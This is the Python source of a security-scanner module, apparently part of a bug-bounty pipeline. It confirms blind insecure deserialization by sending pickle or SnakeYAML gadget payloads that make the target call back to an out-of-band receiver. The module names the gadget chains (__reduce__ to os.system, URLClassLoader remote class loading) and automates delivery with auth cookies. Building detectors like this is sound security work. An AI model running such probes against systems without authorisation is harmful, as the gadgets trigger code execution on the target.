"""
Smart OOB Deserialization Hunter - 帯域外(OOB)デシリアライズ 検出スペシャリスト (SGK-2026-0496)

安全でないデシリアライズ（Python pickle 等）は、逆シリアライズ時に攻撃者ガジェットを実行する
（RCE 級）。応答に何も返らなくても、ガジェットに**外向き HTTP コールバック**を仕込めば OOB で
確定できる（SGK-2026-0494 の基盤を横展開）。

流れ：`OOBProvider` が一意コールバック URL＋token を発行 → デシリアライズ時に受信器へ HTTP GET
するペイロード（`oob_payload_builders.build_oob_payload`）を生成 → エンコード（hex 等）して sink へ
送信 → 標的がデシリアライズ → **我々の受信器に一意 token 到達** → OOB デシリアライズ確定。
token は乱数で、受信器に届けば「攻撃者ペイロードが逆シリアライズ・実行された」決定的証拠。

確定バーの汎用 OOB マーカー `oob_interaction_received` を共有（vuln_type=deserialization）。封印再現も
`_check_oob_replay` の builder パスで fresh callback から作り直して再送。製品固有ハードコードなし。
"""
import logging
from typing import Any, Dict, List, Optional, Tuple

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence
from src.core.detection.oob_payload_builders import build_oob_payload, encode_payload

logger = logging.getLogger(__name__)

_DESER_PARAMS: Tuple[str, ...] = (
    "data_obj", "data", "obj", "payload", "pickle", "object", "o", "state", "session",
)
_DESER_POLL_TIMEOUT = 10.0


def _host_of(u: str) -> str:
    """URL から Host ヘッダ値（host[:port]）を取り出す（PoC 表示用・失敗時は空）。"""
    try:
        from urllib.parse import urlsplit
        return urlsplit(u).netloc or ""
    except Exception:  # noqa: BLE001 — 表示用ベストエフォート
        return ""


class SmartOOBDeserHunter(Specialist):
    name = "SmartOOBDeserHunter"
    description = "Blind (OOB) insecure-deserialization detector via callback gadget"
    timeout_seconds = 180
    is_aggressive = False

    def __init__(self, config: Dict = None):
        super().__init__()
        self.config = config or {}

    def _params(self, task: Task) -> Dict[str, Any]:
        return task.params if isinstance(getattr(task, "params", None), dict) else {}

    def _auth_headers(self, task: Task) -> Dict[str, str]:
        params = self._params(task)
        _auth = params.get("_auth", {}) if isinstance(params.get("_auth"), dict) else {}
        headers = dict(_auth.get("auth_headers", {}) or {})
        cookies = str(_auth.get("cookies", "") or params.get("cookies", "") or "")
        if cookies and "Cookie" not in headers:
            headers["Cookie"] = cookies
        return headers

    def _oob_provider(self):
        provider = getattr(self, "_oob", None)
        if provider is not None:
            return provider
        from src.core.detection.oob_provider import LocalOOBProvider
        self._oob = LocalOOBProvider()
        return self._oob

    def _candidate_params(self, task: Task) -> List[str]:
        params = self._params(task)
        provided = params.get("deser_params") or params.get("deser_param")
        fields: List[str] = []
        if isinstance(provided, str) and provided.strip():
            fields.append(provided.strip())
        elif isinstance(provided, (list, tuple)):
            fields.extend(str(p) for p in provided)
        for p in _DESER_PARAMS:
            if p not in fields:
                fields.append(p)
        return fields

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        provider = self._oob_provider()
        started = False
        try:
            await provider.start()
            started = True
        except Exception as exc:  # noqa: BLE001 — receiver boundary, fail closed
            logger.warning("[%s] OOB provider start failed: %s", self.name, exc)
            return []
        try:
            result = await self._probe(task, provider)
        finally:
            if started:
                try:
                    await provider.stop()
                except Exception:  # noqa: BLE001 — best-effort cleanup
                    pass
        if result is None:
            return []
        return [self._build_finding(task.target, result)]

    async def _probe(self, task: Task, provider) -> Optional[Dict[str, Any]]:
        params = self._params(task)
        url = task.target
        headers = self._auth_headers(task)
        kind = str(params.get("deser_kind") or "python_pickle")
        encoding = str(params.get("deser_encoding") or "hex")
        mode = str(params.get("deser_mode") or "form").lower()
        # path モード（例: Java SnakeYAML の GET /config/<base64>）はパラメータ名を持たず
        # エンコード済みペイロードを URL パス末尾に付けて 1 回だけ GET する。
        candidates = [""] if mode == "path" else self._candidate_params(task)
        for param in candidates:
            callback_url, token = provider.new_callback()
            try:
                raw = build_oob_payload(kind, callback_url)
            except ValueError as exc:
                logger.warning("[%s] builder failed: %s", self.name, exc)
                return None
            encoded = encode_payload(raw, encoding)
            try:
                status = await self._send(mode, url, param, encoded, headers)
            except Exception as exc:  # noqa: BLE001 — network boundary
                logger.debug("[%s] send failed (%s): %s", self.name, param, exc)
                continue
            interaction = await provider.poll(token, timeout=_DESER_POLL_TIMEOUT)
            if interaction and token in str(interaction.get("path", "")):
                # 実際に送信した具体リクエスト（生証拠）: path は URL 末尾に付けた本体、
                # form/raw はボディ。judge にプレースホルダでなく実バイト列を見せる。
                if mode == "path":
                    sent_url = url.rstrip("/") + "/" + str(encoded)
                    sent_payload = str(encoded)
                elif mode == "raw":
                    sent_url = url
                    sent_payload = str(encoded)
                else:
                    sent_url = url
                    sent_payload = f"{param}={encoded}"
                return {
                    "request_url": url, "sent_url": sent_url, "sent_payload": sent_payload,
                    "mode": mode, "param": param, "kind": kind,
                    "encoding": encoding, "callback_url": callback_url, "token": token,
                    "request_status": status, "interaction": interaction,
                    "auth_headers": headers,
                }
        return None

    async def _send(self, mode, url, param, encoded, headers) -> int:
        h = dict(headers or {})

        async def _do(client):
            if mode == "path":
                # エンコード済みペイロードを URL パス末尾に付けて GET（例: /config/<base64>）。
                full = url.rstrip("/") + "/" + str(encoded)
                return await client.request("GET", full, headers=h, use_proxy=True)
            if mode == "raw":
                return await client.request("POST", url, data=encoded, headers=h, use_proxy=True)
            return await client.request("POST", url, data={param: encoded}, headers=h, use_proxy=True)

        injected = getattr(self, "_client", None)
        if injected is not None:
            resp = await _do(injected)
        else:
            from src.core.infra.network_client import AsyncNetworkClient
            async with AsyncNetworkClient() as client:
                resp = await _do(client)
        return int(getattr(resp, "status", 0) or 0)

    def _build_finding(self, target_url: str, proof: Dict[str, Any]) -> Finding:
        url = proof["request_url"]
        mode = proof["mode"]
        param = proof["param"]
        kind = proof["kind"]
        encoding = proof["encoding"]
        callback_url = proof["callback_url"]
        token = proof["token"]
        status = proof["request_status"]
        interaction = proof["interaction"]
        sent_url = str(proof.get("sent_url") or url)
        sent_payload = str(proof.get("sent_payload") or "")
        remote_ip = str(interaction.get("remote_ip", ""))
        channel = str(interaction.get("channel") or "http").lower()
        cb_method = str(interaction.get("method") or "GET")
        cb_path = str(interaction.get("path") or "")
        cb_headers = interaction.get("headers") if isinstance(interaction.get("headers"), dict) else {}
        cb_host = str(cb_headers.get("Host") or cb_headers.get("host") or "")
        cb_ua = str(cb_headers.get("User-Agent") or cb_headers.get("user-agent") or "")
        all_inter = interaction.get("interactions")
        if not isinstance(all_inter, list) or not all_inter:
            all_inter = [interaction]

        # kind ごとのガジェット説明（poc/impact 用・言語非依存に正確化）。
        if kind == "java_snakeyaml":
            gadget_desc = (
                "SnakeYAML !!javax.script.ScriptEngineManager[URLClassLoader[URL(callback/)]] "
                "gadget; on load() the JVM ServiceLoader fetches our receiver"
            )
            deser_verb = "load()/deserialize the attacker-controlled YAML"
        else:
            gadget_desc = "gadget with __reduce__ -> os.system(HTTP callback to our receiver)"
            deser_verb = "unpickle the attacker-controlled object"

        http_method = "GET" if mode == "path" else "POST"
        if mode == "path":
            where = "URL path segment"
            # 具体リクエスト: プレースホルダではなく実際に送った完全な URL（base64 本体込み）。
            poc_request = (
                f"GET {sent_url} HTTP/1.1\r\n"
                f"Host: {_host_of(sent_url)}\r\n"
                "\r\n"
                f"# ^ the path segment after '{url.rstrip('/')}/' is the {encoding}-encoded {kind} "
                f"payload actually sent. Decoded gadget: {gadget_desc}. Target will {deser_verb}."
            )
        elif mode == "raw":
            where = "request body"
            poc_request = (
                f"POST {url} HTTP/1.1\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n"
                f"{sent_payload}\r\n"
                f"# ^ the body above is the {encoding}-encoded {kind} payload actually sent "
                f"({gadget_desc}). Target will {deser_verb}."
            )
        else:
            where = f"form field {param}"
            poc_request = (
                f"POST {url} HTTP/1.1\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                f"{sent_payload}\r\n"
                f"# ^ the body above is the {encoding}-encoded {kind} payload actually sent in "
                f"{where} ({gadget_desc}). Target will {deser_verb}."
            )
        if channel == "dns":
            # DNS OOB: 逆シリアライズ時に標的リゾルバが gadget 内ホスト名を解決した DNS クエリ
            # として提示（HTTP 形式で書かない・[[poc-judge-raw-evidence]]）。
            dns_lines = []
            for it in all_inter:
                p = str(it.get("path") or "")
                dns_lines.append(f"  DNS query: QNAME={p} (type A)")
            inbound_block = "\r\n".join(dns_lines)
            poc_response = (
                f"HTTP/1.1 {status}\r\n"
                "\r\n"
                "(in-band response does not reveal gadget execution: blind)\r\n"
                "\r\n"
                "===== RAW OUT-OF-BAND DNS QUERIES OBSERVED AT OUR DNS RECEIVER (server log) =====\r\n"
                "Our receiver is the authoritative DNS server for the callback domain; during "
                "processing of the request above, the target's own resolver sent these DNS queries:\r\n"
                f"{inbound_block}\r\n"
                f"  (resolver/source {remote_ip})\r\n"
                "\r\n"
                f"CORRELATION: the random token '{token}' is the leftmost label of every queried FQDN "
                f"above AND was placed by us ONLY inside the {kind} gadget we sent (visible in the "
                "request URL above). No in-band channel could deliver this token to our DNS server; "
                "the target parsing/deserializing our attacker-controlled input and resolving the "
                "gadget's callback hostname is the only cause"
                + (
                    ". The gadget's URLClassLoader/ServiceLoader resolves the attacker-named host "
                    "before fetching, so the query proves the JVM acted on our gadget"
                    if kind == "java_snakeyaml"
                    else ""
                )
                + " => blind (out-of-band, DNS) insecure deserialization (RCE-class) confirmed."
            )
        else:
            # 生の受信ログ: 同一 token に届いた全インバウンド行（Java は META-INF 取得→返した
            # クラス名の取得と複数回叩く）＋ User-Agent（Java/x.x.x = JVM 由来の決定的証拠）。
            inbound_lines = []
            for it in all_inter:
                m = str(it.get("method") or "")
                p = str(it.get("path") or "")
                ih = it.get("headers") if isinstance(it.get("headers"), dict) else {}
                ua = str(ih.get("User-Agent") or ih.get("user-agent") or "")
                inbound_lines.append(
                    f"  {m} {p} HTTP/1.1" + (f"   (User-Agent: {ua})" if ua else "")
                )
            inbound_block = "\r\n".join(inbound_lines)
            poc_response = (
                f"HTTP/1.1 {status}\r\n"
                "\r\n"
                "(in-band response does not reveal gadget execution: blind)\r\n"
                "\r\n"
                "===== RAW OUT-OF-BAND REQUESTS OBSERVED AT OUR OOB RECEIVER (server log) =====\r\n"
                "During processing of the request above, the target itself connected to our receiver:\r\n"
                f"{inbound_block}\r\n"
                + (f"  Host: {cb_host}\r\n" if cb_host else "")
                + f"  (source IP: {remote_ip}"
                + (f", User-Agent: {cb_ua}" if cb_ua else "")
                + ")\r\n"
                "\r\n"
                f"CORRELATION: the random token '{token}' appears in every inbound path above AND was "
                f"placed by us ONLY inside the {kind} gadget we sent (visible in the request URL above). "
                "No in-band channel could deliver this token to our server; the target parsing/"
                "deserializing our attacker-controlled input is the only cause"
                + (
                    ". The User-Agent identifies the target's own JVM as the client, and the follow-up "
                    "fetch of the class name we returned (…/<ClassName>.class) is the JVM's ServiceLoader "
                    "attempting to load attacker-named code"
                    if kind == "java_snakeyaml"
                    else ""
                )
                + " => blind (out-of-band) insecure deserialization (RCE-class) confirmed."
            )
        gadget_ja = (
            "（SnakeYAML の ScriptEngineManager/URLClassLoader ガジェット→JVM の ServiceLoader が"
            "外向き HTTP 取得）"
            if kind == "java_snakeyaml"
            else "（`__reduce__`→`os.system`）"
        )
        if channel == "dns":
            impact = (
                f"標的が攻撃者制御の {kind} オブジェクトを逆シリアライズし、ガジェット{gadget_ja}"
                "を起動した。in-band では何も返さない（ブラインド）が、逆シリアライズ時にガジェット内の"
                f"コールバック**ホスト名を名前解決**する DNS クエリ（一意 token '{token}' を含む FQDN）が、"
                f"我々が権威 DNS として動作する受信器へ標的側リゾルバ（{remote_ip}）から届いた。token は"
                "我々が送ったガジェットにしか存在しないため、任意コード実行に至る安全でないデシリアライズの"
                "決定的証拠（RCE 級・真ブラインド／標的が外向き HTTP を出せない環境でも DNS 解決だけで確定・"
                "良性コールバックで非破壊確認）。"
            )
            title = "Blind (OOB, DNS) Insecure Deserialization via gadget hostname resolution"
            description = (
                f"Insecure deserialization confirmed out-of-band via DNS: a {kind} gadget caused the "
                f"target to resolve its callback hostname, and the DNS query for token '{token}' reached "
                f"our authoritative DNS receiver from the target ({remote_ip}) during deserialization. "
                f"No in-band reflection (HTTP {status}). RCE-class."
            )
        else:
            impact = (
                f"標的が攻撃者制御の {kind} オブジェクトを逆シリアライズし、ガジェット{gadget_ja}"
                "を起動した。in-band では何も返さない（ブラインド）が、逆シリアライズ時に"
                f"我々の受信器へ一意 token '{token}' のコールバックが標的（{remote_ip}）から届いた。token は"
                "我々が送ったガジェットにしか存在しないため、任意コード実行に至る安全でないデシリアライズの"
                "決定的証拠（RCE 級・良性コールバックで非破壊確認）。"
            )
            title = "Blind (OOB) Insecure Deserialization via callback gadget"
            description = (
                f"Insecure deserialization confirmed out-of-band: a {kind} gadget delivered the unique "
                f"token '{token}' to our receiver from the target ({remote_ip}) during deserialization. "
                f"No in-band reflection (HTTP {status}). RCE-class."
            )
        return Finding(
            target_url=target_url,
            vuln_type=VulnType.DESERIALIZATION,
            severity=Severity.CRITICAL,
            title=title,
            description=description,
            source_agent=self.name,
            confidence=0.97,
            impact=impact,
            reproduction_steps=[
                "OOB 受信器で一意コールバック URL＋token を発行する。",
                f"逆シリアライズ時に受信器へ外向き HTTP する {kind} ガジェットを生成し {where} に入れて "
                f"{http_method} {url} に送る。",
                "受信器に token 付きのコールバックが標的から届くことを確認する（＝OOB デシリアライズ）。",
            ],
            tags=["deserialization", "blind", "oob", "critical", "oob_interaction_received"],
            evidence=Evidence(
                request_method=http_method,
                request_url=sent_url,  # 具体 URL（path モードは base64 本体込み）
                request_headers={**proof.get("auth_headers", {})},
                request_body=sent_payload,  # 実際に送った具体ペイロード
                response_status=status,
                response_headers={},
                response_body="",  # blind
            ),
            additional_info={
                "oob_evidence": {
                    "vuln_class": "deserialization",
                    "channel": channel,
                    "token": token,
                    "callback_url": callback_url,
                    # token を含む「送出内容」= payout_grade の "token in payload" 検証に用いる
                    # （ガジェット内の callback URL に token が平文で存在する）。
                    "payload": f"{kind} gadget -> outbound HTTP callback {callback_url}",
                    "interaction_received": True,
                    "interaction": interaction,
                    "request_status": status,
                },
                "oob_replay": {
                    "method": http_method,
                    "url": url,
                    "mode": mode,
                    "param": param,
                    "content_type": None,
                    # builder パス: fresh callback からガジェットを作り直して再送する。
                    "builder": kind,
                    "encoding": encoding,
                    "payload_template": _OOB_BUILDER_TEMPLATE,
                },
                "unique_oob_callback_received": True,
                "poc_request": poc_request,
                "poc_response": poc_response,
            },
        )


# 封印再現の記述子検証（payload_template 非空要件）を満たすためのマーカ文字列。
# 実際の再送ペイロードは builder（deser_kind）＋fresh callback から生成される（{OOB} 置換ではない）。
_OOB_BUILDER_TEMPLATE = "{OOB}"
